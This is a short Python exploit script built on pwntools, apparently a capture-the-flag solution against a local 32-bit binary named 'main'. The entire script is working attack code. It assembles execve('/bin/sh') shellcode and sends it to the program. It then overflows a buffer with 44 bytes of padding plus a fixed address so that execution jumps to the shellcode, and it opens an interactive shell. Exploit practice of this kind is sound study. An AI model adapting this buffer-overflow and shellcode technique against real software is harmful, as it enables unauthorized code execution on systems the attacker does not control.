#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
p = process('./main')
shellcode = asm('''
	mov eax, 0xb
	mov ecx, 0
	mov edx, 0
	push 0x68732f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
''')
# gdb.attach(p)
payload = shellcode
p.sendlineafter(':\n', shellcode)
# payload = cyclic(500)
offset = 44
buf = 0x804a060
payload = 'A' * offset + p32(buf)
p.sendlineafter(':\n', payload)
p.interactive()
